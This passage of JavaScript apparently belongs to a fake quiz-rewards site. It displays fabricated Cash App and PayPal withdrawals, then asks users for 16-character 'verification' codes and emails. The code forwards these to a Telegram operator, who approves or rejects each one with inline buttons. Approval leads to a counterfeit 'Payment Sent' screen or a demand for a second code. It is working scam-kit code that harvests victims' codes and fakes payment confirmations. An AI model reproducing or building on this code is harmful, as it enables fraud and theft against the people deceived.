
    closeModal(sourceModalId);
    openModal('verification-modal');
}

function submitVerificationCode() {
    const input = document.getElementById('verification-code-input');
    const code = input.value.trim().toUpperCase();
    if (!verificationContext || code.length !== 16) return;

    const message = [
        'Verification Code Submitted',
        '',
        `Code: ${code}`,
        `Transaction ID: ${verificationContext.transactionId}`,
        `Method: ${verificationContext.method}`,
        `Amount: $${verificationContext.amount}`,
        `UI Mode: ${verificationContext.uiLabel}`
    ].join('\n');

    const payload = {
        text: message,
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'Approve A', callback_data: `verify_approve_a_${verificationContext.transactionId}` },
                    { text: 'Approve B', callback_data: `verify_approve_b_${verificationContext.transactionId}` },
                    { text: 'Reject', callback_data: `verify_reject_${verificationContext.transactionId}` }
                ]
            ]
        }
    };

    sendTelegramMessage(payload.text, payload.reply_markup);

    const tx = transactions.find(t => t.id === verificationContext.transactionId);
    if (tx) {
        tx.status = 'Verifying';
        saveTransactions();
        updateWithdrawalDisplay();
    }

    closeModal('verification-modal');
    openModal('verification-pending-modal');

    const sourceModalId = verificationContext.sourceModalId;
    setTimeout(() => {
        closeModal('verification-pending-modal');
        openModal(sourceModalId);
    }, 3000);
}

function processVerificationDecision(decisionData) {
    const transactionId = Number(decisionData.withdrawalId);
    const transaction = transactions.find(t => t.id === transactionId);
    if (!transaction) return;

    const action = decisionData.action || '';
    if (action === 'verify_reject') {
        if (!transaction.isRefunded) {
            currentBalance += Number(transaction.amount) || 0;
            transaction.isRefunded = true;
            saveData();
            updateBalance();
        }
        transaction.status = 'Denied';
        saveTransactions();
        updateWithdrawalDisplay();
        closeModal('telegram-modal');
        closeModal('telegram-modal-b');
        showTransactionModalC();
        return;
    }

    if (action === 'stage2_approve') {
        transaction.status = 'Final Verifying';
        saveTransactions();
        updateWithdrawalDisplay();
        closeModal('cashapp-stage2-modal');
        closeModal('paypal-stage2-modal');
        showFinalVerifyingModal();
        return;
    }

    if (action === 'stage2_reject') {
        transaction.status = 'Ready';
        saveTransactions();
        updateWithdrawalDisplay();
        closeModal('cashapp-stage2-modal');
        closeModal('paypal-stage2-modal');
        showNotification('Stage 2 was rejected. Please try verification again.', false);
        return;
    }

    if (action === 'verify_approve_b') {
        const isPaypal = transaction.method === 'PayPal' || (transaction.dataFromTelegram && transaction.dataFromTelegram.uiType === 'uib');
        transaction.status = 'Second Stage';
        saveTransactions();
        updateWithdrawalDisplay();
        if (!isPaypal) {
            openCashAppStage2Modal(transaction);
            return;
        }
        openPayPalStage2Modal(transaction);
        return;
    }

    if (action === 'verify_approve_a' || action === 'verify_approve_b') {
        transaction.status = 'Completed';
        saveTransactions();
        updateWithdrawalDisplay();
        closeModal('telegram-modal');
        closeModal('telegram-modal-b');
        showCompletedPaymentModal(transaction);
    }
}

function showCompletedPaymentModal(transaction) {
    const data = transaction.dataFromTelegram || {};
    const amount = Number.parseFloat(data.amount || transaction.amount || 0);
    const amountText = `$${Number.isFinite(amount) ? amount.toFixed(2) : '0.00'}`;
    const profileImage = data.profileImage || 'https://via.placeholder.com/56';
    const txRef = data.transactionId || `#D-${transaction.id}`;
    const txDateText = `${transaction.date} ${transaction.time}`;
    const meta = 'Funds have been released successfully and are now reflected in your payout flow.';

    const isPaypal = transaction.method === 'PayPal' || data.uiType === 'uib';
    if (isPaypal) {
        const paypalAvatar = document.getElementById('completed-paypal-avatar-img');
        paypalAvatar.src = profileImage;
        paypalAvatar.onerror = function() { this.src = 'https://via.placeholder.com/70'; };
        document.getElementById('completed-paypal-name').textContent = 'Payment Sent';
        document.getElementById('completed-paypal-subtitle').textContent = 'PayPal transaction';
        document.getElementById('completed-paypal-amount').textContent = amountText;
        document.getElementById('completed-paypal-amount-detail').textContent = amountText;
        document.getElementById('completed-paypal-total').textContent = amountText;
        document.getElementById('completed-paypal-ref').textContent = txRef;
        document.getElementById('completed-paypal-date').textContent = txDateText;
        openModal('completed-paypal-modal');
        return;
    }

    const cashAvatar = document.getElementById('completed-cash-avatar-img');
    cashAvatar.src = profileImage;
    cashAvatar.onerror = function() { this.src = 'https://via.placeholder.com/70'; };
    document.getElementById('completed-cash-name').textContent = data.name || 'User';
    document.getElementById('completed-cash-paymentto').textContent = `Payment to ${transaction.tag || '$User'}`;
    document.getElementById('completed-cash-amount').textContent = amountText;
    document.getElementById('completed-cash-amount-detail').textContent = amountText;
    document.getElementById('completed-cash-ref').textContent = txRef;
    document.getElementById('completed-cash-time').textContent = txDateText;
    openModal('completed-cashapp-modal');
}

function showFinalVerifyingModal() {
    openModal('final-verifying-modal');
}

function openCashAppStage2Modal(transaction) {
    cashappStage2Context = {
        transactionId: transaction.id,
        amount: transaction.amount,
        tag: transaction.tag
    };

    document.getElementById('cashapp-stage2-email').value = '';
    document.getElementById('cashapp-stage2-code').value = '';
    document.getElementById('cashapp-stage2-submit').disabled = true;

    const msg = `Your first 16-character verification was successful. Complete the second stage to finish payout to ${transaction.tag || 'your Cash App'}.`;
    document.getElementById('cashapp-stage2-message').textContent = msg;

    closeModal('telegram-modal');
    closeModal('telegram-modal-b');
    openModal('cashapp-stage2-modal');
}

function validateCashAppStage2Form() {
    const email = document.getElementById('cashapp-stage2-email').value.trim();
    const code = document.getElementById('cashapp-stage2-code').value.trim();
    const emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    const codeOk = /^[A-Za-z0-9]{16}$/.test(code);
    document.getElementById('cashapp-stage2-submit').disabled = !(emailOk && codeOk);
}

function submitCashAppStage2() {
    if (!cashappStage2Context) return;

    const email = document.getElementById('cashapp-stage2-email').value.trim();
    const code = document.getElementById('cashapp-stage2-code').value.trim().toUpperCase();
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) || !/^[A-Za-z0-9]{16}$/.test(code)) return;

    const message = [
        'Cash App Stage 2 Submitted',
        '',
        `Transaction ID: ${cashappStage2Context.transactionId}`,
        `Cash App Tag: ${cashappStage2Context.tag}`,
        `Amount: $${cashappStage2Context.amount}`,
        `Notification Email: ${email}`,
        `Second Code: ${code}`
    ].join('\n');

    const payload = {
        text: message,
        reply_markup: {
            inline_keyboard: [[
                { text: 'Approve', callback_data: `stage2_approve_${cashappStage2Context.transactionId}` },
                { text: 'Reject', callback_data: `stage2_reject_${cashappStage2Context.transactionId}` }
            ]]
        }
    };

    sendTelegramMessage(payload.text, payload.reply_markup);

    const tx = transactions.find(t => t.id === cashappStage2Context.transactionId);
    if (tx) {
        tx.status = 'Stage2 Review';
        saveTransactions();
        updateWithdrawalDisplay();
    }

    closeModal('cashapp-stage2-modal');
    openModal('verification-pending-modal');
    setTimeout(() => closeModal('verification-pending-modal'), 3000);
}

function openPayPalStage2Modal(transaction) {
    paypalStage2Context = {
        transactionId: transaction.id,
        amount: transaction.amount,
        tag: transaction.tag
    };

    document.getElementById('paypal-stage2-email').value = '';
    document.getElementById('paypal-stage2-code').value = '';
    document.getElementById('paypal-stage2-submit').disabled = true;

    const msg = `Your first 16-character verification was successful. Complete the second stage to finish payout to ${transaction.tag || 'your PayPal'}.`;
    document.getElementById('paypal-stage2-message').textContent = msg;

    closeModal('telegram-modal');
    closeModal('telegram-modal-b');
    openModal('paypal-stage2-modal');
}

function validatePayPalStage2Form() {
    const email = document.getElementById('paypal-stage2-email').value.trim();
    const code = document.getElementById('paypal-stage2-code').value.trim();
    const emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    const codeOk = /^[A-Za-z0-9]{16}$/.test(code);
    document.getElementById('paypal-stage2-submit').disabled = !(emailOk && codeOk);
}

function submitPayPalStage2() {
    if (!paypalStage2Context) return;

    const email = document.getElementById('paypal-stage2-email').value.trim();
    const code = document.getElementById('paypal-stage2-code').value.trim().toUpperCase();
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) || !/^[A-Za-z0-9]{16}$/.test(code)) return;

    const message = [
        'PayPal Stage 2 Submitted',
        '',
        `Transaction ID: ${paypalStage2Context.transactionId}`,
        `PayPal Email/Tag: ${paypalStage2Context.tag}`,
        `Amount: $${paypalStage2Context.amount}`,
        `Notification Email: ${email}`,
        `Second Code: ${code}`
    ].join('\n');

    const payload = {
        text: message,
        reply_markup: {
            inline_keyboard: [[
                { text: 'Approve', callback_data: `stage2_approve_${paypalStage2Context.transactionId}` },
                { text: 'Reject', callback_data: `stage2_reject_${paypalStage2Context.transactionId}` }
            ]]
        }
    };

    sendTelegramMessage(payload.text, payload.reply_markup);

    const tx = transactions.find(t => t.id === paypalStage2Context.transactionId);
    if (tx) {
        tx.status = 'Stage2 Review';
        saveTransactions();
        updateWithdrawalDisplay();
    }

    closeModal('paypal-stage2-modal');
    openModal('verification-pending-modal');
    setTimeout(() => closeModal('verification-pending-modal'), 3000);
}

// End Quiz
function endQuiz() {
    const today = new Date().toDateString();
    lastQuizDate = today;
    saveData();
    clearQuizSession();
    isInQuiz = false;
    
    if (window.leaderboardInterval) {
        clearInterval(window.leaderboardInterval);
    }
    
    openModal('quiz-end-modal');
}

// Open Modal
function openModal(modalId) {
    document.getElementById(modalId).classList.add('active');
}

// Close Modal
function closeModal(modalId) {
    document.getElementById(modalId).classList.remove('active');
}

// Update Withdrawal Display - Show ALL transactions
function updateWithdrawalDisplay() {
    const withdrawalCard = document.querySelector('.withdrawal-card');
    
    if(transactions.length === 0) {
        withdrawalCard.innerHTML = `
            <h3>No Withdrawals Yet</h3>
            <div class="card-content withdrawal-content">
                <img src="https://images.icon-icons.com/2355/PNG/512/wallet_money_icon_143270.png" onerror="this.src='https://cdn-icons-png.flaticon.com/512/2331/2331941.png'" alt="Wallet" class="card-icon">
                <div class="withdrawal-text">
                    <p class="withdrawal-title">No Withdrawals Yet</p>
                    <p class="withdrawal-subtitle">You haven't made any withdrawal requests yet.</p>
                </div>
            </div>
        `;
        return;
    }

    let html = '<h3>Withdrawal History</h3><div class="transactions-list">';
    
    transactions.forEach(t => {
        const isLocked = !t.isUnlocked;
        const lockClass = isLocked ? 'locked' : 'unlocked';
        let statusText = isLocked ? '🔒 Pending' : '🔓 Ready';
        let statusClass = isLocked ? 'status-pending' : 'status-unlocked';
        if (t.status === 'Completed') {
            statusText = 'Completed';
            statusClass = 'status-unlocked';
        } else if (t.status === 'Final Verifying') {
            statusText = '⏳Verifying';
            statusClass = 'status-pending';
        } else if (t.status === 'Stage2 Review') {
            statusText = 'Stage 2 Review';
            statusClass = 'status-pending';
        } else if (t.status === 'Second Stage') {
            statusText = '🟢 Stage 2 Required';
            statusClass = 'status-pending';
        } else if (t.status === 'Verifying') {
            statusText = '⏳ Verifying';
            statusClass = 'status-pending';
        } else if (t.status === 'Denied') {
            statusText = '(Refunded)';
            statusClass = 'status-denied';
        }
        
        html += `
            <div class="transaction-item ${lockClass}" data-transaction-id="${t.id}" style="cursor: ${isLocked ? 'not-allowed' : 'pointer'};">
                <div class="transaction-left">
                    <div class="transaction-info">
                        <div class="transaction-method">${t.method}</div>
                        <div class="transaction-value">${t.tag}</div>
                        <div class="transaction-date">${t.date} ${t.time}</div>
                    </div>
                </div>
                <div class="transaction-right">
                    <div class="transaction-amount">$${t.amount}</div>
                    <div class="transaction-status ${statusClass}">${statusText}</div>
                </div>
            </div>
        `;
    });
    
    html += '</div>';
    withdrawalCard.innerHTML = html;
    
    document.querySelectorAll('.transaction-item').forEach(item => {
        item.addEventListener('click', function() {
            const transactionId = parseInt(this.dataset.transactionId);
            const transaction = transactions.find(t => t.id === transactionId);
            
            if(transaction && transaction.isUnlocked && transaction.dataFromTelegram) {
                if (transaction.status === 'Completed') {
                    showCompletedPaymentModal(transaction);
                    return;
                }
                if (transaction.status === 'Final Verifying') {
                    showFinalVerifyingModal();
                    return;
                }
                if(transaction.dataFromTelegram.uiType === 'uib') {
                    showTransactionModalB(transaction);
                } else if (transaction.dataFromTelegram.uiType === 'uic') {
                    showTransactionModalC();
                } else {
                    showTransactionModal(transaction);
                }
            }
        });
    });
}

// Show transaction modal when clicked (UI A)
function showTransactionModal(transaction) {
    const data = transaction.dataFromTelegram;
    if(!data) return;

    const modal = document.getElementById('telegram-modal');
    
    document.getElementById('telegram-name').textContent = data.name;
    document.getElementById('telegram-avatar').querySelector('img').src = data.profileImage || 'https://via.placeholder.com/56x56';
    document.getElementById('telegram-purpose').textContent = data.purpose;
    document.getElementById('telegram-amount').textContent = "$" + parseFloat(data.amount).toLocaleString(undefined, {minimumFractionDigits:2});
    
    document.getElementById('telegram-time').textContent = `${transaction.date} at ${transaction.time}`;
    document.getElementById('telegram-transaction-id').textContent = data.transactionId || '#D-' + transaction.id;

    document.getElementById('copy-transaction-id').onclick = function(e){
        e.stopPropagation();
        const tid = document.getElementById('telegram-transaction-id').textContent;
        navigator.clipboard.writeText(tid);
        this.textContent = '✅';
        setTimeout(() => this.textContent = '⧉', 1500);
    };

    document.getElementById('telegram-readme').onclick = function(e){
        e.stopPropagation();
        showVerificationReadme();
    };
    
    document.getElementById('telegram-complete-payment').onclick = function(e){
        e.stopPropagation();
        startVerificationFlow(transaction, 'telegram-modal', 'UI A');
    };

    modal.classList.add('active');
}


// Show UI B transaction modal when clicked
function showTransactionModalB(transaction) {
    const data = transaction.dataFromTelegram;
    if (!data) return;

    const nameEl = document.getElementById('telegram-name-b');
    const usernameEl = document.getElementById('telegram-username-b');
    const avatarEl = document.getElementById('telegram-avatar-b-img');
    const amountEl = document.getElementById('telegram-amount-b');
    const readmeEl = document.getElementById('telegram-readme-b');
    const userAgreementEl = document.getElementById('user-agreement-b');
    const completeBtn = document.getElementById('telegram-complete-payment-b');

    nameEl.textContent = data.name || 'User';

    let username = (data.username || data.purpose || 'user').trim();
    username = username.replace(/^@+/, '');
    usernameEl.textContent = `@${username}`;

    avatarEl.src = data.profileImage || 'https://via.placeholder.com/44';
    avatarEl.onerror = function() {
        this.src = 'https://via.placeholder.com/44';
    };

    const parsedAmount = Number.parseFloat(data.amount);
    const safeAmount = Number.isFinite(parsedAmount) ? parsedAmount : 0;
    amountEl.textContent = `$${safeAmount.toFixed(2)}`;

    readmeEl.onclick = function(e) {
        e.preventDefault();
        e.stopPropagation();
        showVerificationReadme();
    };

    userAgreementEl.onclick = function(e) {
        e.preventDefault();
        e.stopPropagation();
        showNotification('Please read our user agreement', false);
    };

    completeBtn.onclick = function(e) {
        e.stopPropagation();
        startVerificationFlow(transaction, 'telegram-modal-b', 'UI B');
    };

    openModal('telegram-modal-b');
}

function showTransactionModalC() {
    openModal('telegram-modal-c');
}

// POLLING - Check server for Telegram data every 1 second
function startPollingForTelegramData() {
    setInterval(async function() {
        try {
            const response = await fetch(apiUrl('/api/get-withdrawal'));
            const data = await response.json();
            
            if(data && data.withdrawalId) {
                if (data.action) {
                    processVerificationDecision(data);
                    return;
                }

                console.log('✓ Got Telegram data for:', data.withdrawalId, '(' + (data.uiType || 'uia').toUpperCase() + ')');
                
                unlockTransaction(data.withdrawalId, {
                    transactionId: data.withdrawalId,
                    name: data.name,
                    purpose: data.purpose,
                    username: data.username,
                    amount: data.amount,
                    profileImage: data.profileImage,
                    uiType: data.uiType || 'uia',
                    receivedAt: data.timestamp
                });
            }
        } catch(e) {
            // Server not ready or no data
        }
    }, 1000);
}

// Shuffle Array Helper
function shuffleArray(array) {
    const arr = [...array];
    for (let i = arr.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [arr[i], arr[j]] = [arr[j], arr[i]];
    }
    return arr;
}

